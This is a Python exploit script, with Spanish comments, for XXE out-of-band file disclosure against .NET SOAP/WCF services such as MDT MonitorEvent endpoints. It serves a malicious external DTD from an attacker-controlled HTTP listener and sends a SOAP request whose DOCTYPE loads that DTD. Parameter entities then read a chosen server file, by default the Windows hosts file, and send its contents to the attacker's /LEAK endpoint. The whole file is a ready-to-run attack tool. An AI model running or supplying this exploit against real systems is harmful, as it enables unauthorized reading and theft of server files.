#!/usr/bin/env python3
"""
XXE Out-of-Band sobre un servicio SOAP/WCF (.NET) -> lectura/exfiltracion de archivos

Muchos servicios WCF (ej. endpoints MDT MonitorEvent) parsean el body SOAP con
un parser XML que resuelve entidades externas. Si no estan deshabilitadas, se
puede inyectar un DOCTYPE que apunta a una DTD externa controlada por el atacante
y, mediante parameter entities, leer un archivo del servidor y exfiltrarlo
out-of-band (OOB) a nuestro server HTTP.

Este script levanta el server HTTP que sirve la DTD y captura la exfiltracion, y
envia la request SOAP con el DOCTYPE malicioso.

Uso:
    python3 soap-xxe-oob.py \
        --target http://TARGET:9800/MDTMonitorEvent/ \
        --lhost ATACANTE_IP --lport 8000 \
        --file "file:///C:/Windows/System32/drivers/etc/hosts"
"""
import argparse
import http.server
import socketserver
import threading
import urllib.parse

import requests

DTD_TEMPLATE = (
    '<!ENTITY % file SYSTEM "{target_file}">\n'
    '<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '
    '\'http://{lhost}:{lport}/LEAK?d=%file;\'>">\n'
    '%eval;\n'
    '%exfil;\n'
)

SOAP_TEMPLATE = (
    '<?xml version="1.0" encoding="utf-8"?>\n'
    '<!DOCTYPE foo SYSTEM "http://{lhost}:{lport}/evil.dtd">\n'
    '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" '
    'xmlns:a="http://www.w3.org/2005/08/addressing">\n'
    '  <s:Header>\n'
    '    <a:Action s:mustUnderstand="1">http://tempuri.org/IMonitorEventService/PostEvent</a:Action>\n'
    '    <a:To s:mustUnderstand="1">{target}</a:To>\n'
    '  </s:Header>\n'
    '  <s:Body>\n'
    '    <PostEvent xmlns="http://tempuri.org/">\n'
    '      <computerName>x</computerName>\n'
    '      <message>x</message>\n'
    '    </PostEvent>\n'
    '  </s:Body>\n'
    '</s:Envelope>\n'
)


def make_handler(dtd):
    class H(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            if self.path.startswith("/evil.dtd"):
                self.send_response(200)
                self.send_header("Content-Type", "application/xml")
                self.end_headers()
                self.wfile.write(dtd.encode())
            elif self.path.startswith("/LEAK"):
                q = urllib.parse.urlparse(self.path).query
                data = urllib.parse.parse_qs(q).get("d", [""])[0]
                print("\n[+] DATOS EXFILTRADOS:\n")
                print(urllib.parse.unquote(data))
                self.send_response(200)
                self.end_headers()
            else:
                self.send_response(404)
                self.end_headers()

        def log_message(self, *a):
            pass
    return H


def main():
    ap = argparse.ArgumentParser(description="SOAP/WCF XXE out-of-band file disclosure")
    ap.add_argument("--target", required=True, help="URL del endpoint SOAP/WCF")
    ap.add_argument("--lhost", required=True, help="tu IP (la que ve el objetivo)")
    ap.add_argument("--lport", default="8000", help="puerto de tu server HTTP (default 8000)")
    ap.add_argument("--file", default="file:///C:/Windows/System32/drivers/etc/hosts",
                    help="archivo a leer (URI file://)")
    ap.add_argument("--soap-ns", choices=["12", "11"], default="12",
                    help="version de SOAP del endpoint (default 12)")
    args = ap.parse_args()

    dtd = DTD_TEMPLATE.format(target_file=args.file, lhost=args.lhost, lport=args.lport)

    handler = make_handler(dtd)
    httpd = socketserver.TCPServer(("0.0.0.0", int(args.lport)), handler)
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()
    print(f"[*] sirviendo evil.dtd y escuchando exfil en 0.0.0.0:{args.lport}")

    body = SOAP_TEMPLATE.format(lhost=args.lhost, lport=args.lport, target=args.target)
    ct = ("application/soap+xml; charset=utf-8" if args.soap_ns == "12"
          else "text/xml; charset=utf-8")
    print(f"[*] enviando request SOAP XXE a {args.target}")
    try:
        r = requests.post(args.target, data=body.encode(),
                          headers={"Content-Type": ct}, timeout=30, verify=False)
        print("[*] respuesta:", r.status_code)
    except Exception as e:
        print("[!] error enviando la request:", e)

    print("[*] esperando exfiltracion OOB (Ctrl-C para salir)...")
    try:
        t.join()
    except KeyboardInterrupt:
        print("\n[*] saliendo")


if __name__ == "__main__":
    main()
